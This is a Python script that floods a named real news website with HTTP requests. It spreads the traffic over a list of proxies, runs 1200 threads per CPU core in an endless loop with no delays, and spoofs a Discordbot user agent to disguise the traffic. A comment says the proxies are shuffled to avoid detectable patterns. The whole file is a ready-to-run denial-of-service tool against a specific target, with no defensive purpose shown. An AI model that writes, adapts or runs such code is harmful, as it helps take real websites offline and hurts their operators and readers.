import requests
import concurrent.futures
import multiprocessing
import re
import time
import os
import random

url = "https://www.timesofisrael.com/"
user_agent = "Discordbot/2.0 (+https://discordapp.com)"
timeout = 2
requests_per_proxy = 30  # Requests per proxy per process
threads_per_process = 1200  # Threads per CPU core (adjust this based on VPS)

def extract_title(html):
    match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
    return match.group(1).strip() if match else "No Title"

def fetch(index, proxy, run_id):
    try:
        proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        r = requests.get(url, headers={"User-Agent": user_agent}, proxies=proxy_dict, timeout=timeout)
        title = extract_title(r.text)
        print(f"[{index}.{run_id}] Status: {r.status_code} | Title: {title}")
    except Exception as e:
        print(f"[{index}.{run_id}] Error: {e}")

def run_worker(worker_id, proxy_chunk):
    print(f"[CPU {worker_id}] Starting {len(proxy_chunk)} proxies...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_per_process) as executor:
        for idx, proxy in enumerate(proxy_chunk, 1):
            for run_id in range(1, requests_per_proxy + 1):
                executor.submit(fetch, f"{worker_id}-{idx}", proxy, run_id)

def split_chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def load_proxies():
    if os.path.exists("work_proxy.txt"):
        with open("work_proxy.txt") as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(proxies)} working proxies.")
        return proxies
    else:
        print("❌ No work_proxy.txt found. Please run the initial setup first.")
        return []

def main():
    proxies = load_proxies()

    if not proxies:
        print("❌ No proxies found. Exiting.")
        return

    cpu_count = multiprocessing.cpu_count()
    print(f"[*] Using {cpu_count} CPU cores × {threads_per_process} threads per core")
    chunked = list(split_chunks(proxies, max(1, len(proxies) // cpu_count)))

    # Randomize proxies to avoid any specific pattern
    random.shuffle(chunked)

    procs = []
    start = time.time()

    while True:
        for i, chunk in enumerate(chunked):
            p = multiprocessing.Process(target=run_worker, args=(i + 1, chunk))
            p.start()
            procs.append(p)

        for p in procs:
            p.join()

        print(f"\n✅ Loop completed iteration in {time.time() - start:.2f}s")

        # Restart the loop without reset, without delays or breaks
        # Reset the processes each time to avoid stale ones.
        procs.clear()
        start = time.time()  # Reset timer for the next iteration

if __name__ == "__main__":
    main()
